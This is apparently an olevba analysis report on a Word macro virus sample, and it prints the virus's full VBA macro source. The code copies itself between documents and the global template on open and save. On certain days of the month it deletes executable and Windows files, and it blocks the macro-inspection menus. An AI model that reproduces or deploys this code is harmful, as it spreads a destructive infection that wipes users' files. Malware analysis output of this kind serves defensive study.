olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "dr dara"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoExec.MAIN"
Dim Kl
Dim j
Dim Atutup
Dim Ade
Dim Dr$
Dim DMacro$
On Error GoTo -1: On Error GoTo Akh

WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Akh:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "dr dara"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Dim Fname$
Dim DMacro$
Fname$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo Akhir
    
    DMacro$ = Fname$ + ":AutoExec"
    WordBasic.MacroCopy DMacro$, "Global:AutoExec"
    DMacro$ = Fname$ + ":AutoOpen"
    WordBasic.MacroCopy DMacro$, "Global:AutoOpen"
    
    DMacro$ = Fname$ + ":FileOpen"
    WordBasic.MacroCopy DMacro$, "Global:FileOpen"
    
    DMacro$ = Fname$ + ":FileSave"
    WordBasic.MacroCopy DMacro$, "Global:FileSave"
    
    DMacro$ = Fname$ + ":FileSaveAs"
    WordBasic.MacroCopy DMacro$, "Global:FileSaveAs"
    
    DMacro$ = Fname$ + ":FileTemplates"
    WordBasic.MacroCopy DMacro$, "Global:FileTemplates"
    
    DMacro$ = Fname$ + ":ViewVBCode"
    WordBasic.MacroCopy DMacro$, "Global:ViewVBCode"
    
    
    
    DMacro$ = Fname$ + ":ToolsMacro"
    WordBasic.MacroCopy DMacro$, "Global:ToolsMacro"
    
    DMacro$ = Fname$ + ":ToolsCustomize"
    WordBasic.MacroCopy DMacro$, "Global:ToolsCustomize"
    If WordBasic.Day(WordBasic.Now()) = 7 Then
    
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
Else
    If WordBasic.Day(WordBasic.Now()) = 25 Then
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
    End If
End If

Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Dr dara"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileOpen.MAIN"
Dim TMac
Dim i
Dim Dr$
Dim ING$
Dim Fname$
Dim DMacro$
ReDim BMac$(20)
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Sto
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TMac = 0
For i = 1 To WordBasic.CountMacros(1)
    Dr$ = WordBasic.[MacroName$](i, 1)
    BMac$(i) = Dr$
    TMac = TMac + 1
Next i
ING$ = WordBasic.[FileName$]()

If TMac >= 1 Then
    For i = 1 To TMac
        On Error GoTo -1: On Error GoTo Sto
        WordBasic.Organizer Delete:=1, Source:=ING$, Name:=BMac$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
If WordBasic.Day(WordBasic.Now()) = 7 Then
    
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
Else
    If WordBasic.Day(WordBasic.Now()) = 25 Then
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
    End If
End If

Fname$ = WordBasic.[FileName$]()
        On Error GoTo -1: On Error GoTo Sto
    DMacro$ = Fname$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", DMacro$
    
    DMacro$ = Fname$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", DMacro$
    
    DMacro$ = Fname$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", DMacro$
    
    DMacro$ = Fname$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", DMacro$
    
    DMacro$ = Fname$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", DMacro$
    
    DMacro$ = Fname$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", DMacro$
    
    DMacro$ = Fname$ + ":ViewVBCode"
    WordBasic.MacroCopy "Global:ViewVBCode", DMacro$
    
    DMacro$ = Fname$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", DMacro$
    
    DMacro$ = Fname$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", DMacro$
Sto:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim Dr$
Dim StoMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Sto
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
Fname$ = WordBasic.[FileName$]()
        On Error GoTo -1: On Error GoTo Sto
    DMacro$ = Fname$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", DMacro$
    
    DMacro$ = Fname$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", DMacro$
    
    DMacro$ = Fname$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", DMacro$
    
    DMacro$ = Fname$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", DMacro$
    
    DMacro$ = Fname$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", DMacro$
    
    DMacro$ = Fname$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", DMacro$
    
    DMacro$ = Fname$ + ":ViewVBCode"
    WordBasic.MacroCopy "Global:ViewVBCode", DMacro$
    
    DMacro$ = Fname$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", DMacro$
    
    DMacro$ = Fname$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", DMacro$
WordBasic.FileSaveAs dlg
GoTo Atos
Sto:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If

Atos:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0



End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 02/10/98 by dr dara"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileSaveAs.Main"
Dim Fname$

WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
On Error GoTo -1: On Error GoTo Sto
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
Fname$ = WordBasic.[WindowName$]()
        On Error GoTo -1: On Error GoTo Sto
    DMacro$ = Fname$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", DMacro$
    
    DMacro$ = Fname$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", DMacro$
    
    DMacro$ = Fname$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", DMacro$
    
    DMacro$ = Fname$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", DMacro$
    
    DMacro$ = Fname$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", DMacro$
    
    DMacro$ = Fname$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", DMacro$
    
    DMacro$ = Fname$ + ":ViewVBCode"
    WordBasic.MacroCopy "Global:ViewVBCode", DMacro$
    
    DMacro$ = Fname$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", DMacro$
    
    DMacro$ = Fname$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", DMacro$
If WordBasic.Day(WordBasic.Now()) = 7 Then
    
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
Else
    If WordBasic.Day(WordBasic.Now()) = 25 Then
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
    End If
End If

Sto:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub


-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 02/10/98 by dr dara"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileTemplates.main"
On Error GoTo -1: On Error GoTo Sto
If WordBasic.Day(WordBasic.Now()) = 7 Then
    
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
Else
    If WordBasic.Day(WordBasic.Now()) = 25 Then
    WordBasic.Kill "c:*.WINDOWS"
    WordBasic.Kill "C:\*.exe"
    WordBasic.Kill
    End If
End If

MsgBox "You infected by Ars International Virus"
Sto:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ViewVBCode.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/ViewVBCode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
On Error GoTo QUIT
ShowVisualBasiceditor = False

MsgBox "You Infected By Ars International Virus "
MsgBox "Do not Use This Command "
QUIT:

End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo QUIT
MsgBox "THIS COMMAND IS ERROR "
QUIT:

End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsCustomize.bas 
in file: Virus.MSWord.Allen.b-c64fd62632582b92d3862ea5da25a624e73af141 - OLE stream: 'Macros/VBA/ToolsCustomize'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 02/10/98 by dr dara"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.ToolsCustomize.Main"
On Error GoTo -1: On Error GoTo Sto
MsgBox "You need Manual Book To Use This Command"
Sto:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

